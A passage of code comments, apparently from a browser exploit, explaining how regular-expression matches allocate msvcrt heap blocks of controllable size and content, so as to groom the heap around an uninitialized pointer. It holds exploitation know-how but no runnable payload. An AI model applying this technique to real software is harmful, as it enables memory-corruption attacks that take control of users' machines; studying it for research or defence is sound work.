        // uninitialized pointer will contain a value under the exploit's control, allowing the exploit to control

        // ways of spraying the heap allocate memory blocks on another heap and are therefore not useful in this context.
        // When a regular expression is executed and matches are found, a block of memory is allocated through msvcrt
        // for each match. Each block will be used to store the start and end offset of the match in two DWords, as well
        // as the start and end offset of each sub-match, also in two DWords (this is true for x86 and x64). Therefore,
        // changing the number of sub-matches allows control over the size of the block, and changing the offset of the
        // matches allows control over the values stored in the block. In short, the size of the block will be 8 bytes
        // plus 8 bytes for each "()" in the expression. Since all blocks are rounded up to a multiple of 8 bytes, this
        // can be used to allocate and fill blocks of the same size as the block that will contain the uninitialized
        // pointer later.
        // Successive matches will be at successive offsets, so the values stored in each allocated block will be
        // increment by the length of the match. If the size of each match is 4 bytes, the value will increase by 4 in
        // each successive block. For addresses pointing to a heap spray, this is acceptible.
